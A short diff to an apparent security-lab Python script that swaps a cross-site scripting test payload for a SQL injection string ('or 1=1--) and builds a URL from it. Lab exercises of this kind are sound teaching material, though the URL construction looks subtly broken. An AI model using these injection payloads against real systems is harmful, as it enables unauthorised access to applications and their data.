@@ -1,6 +1,6 @@
 import requests
 
-payload = "<script>alert('xss')</script>"
+payload = "'or 1=1--"
 
 #Change url defined by the lab
 url = 'https://' + payload
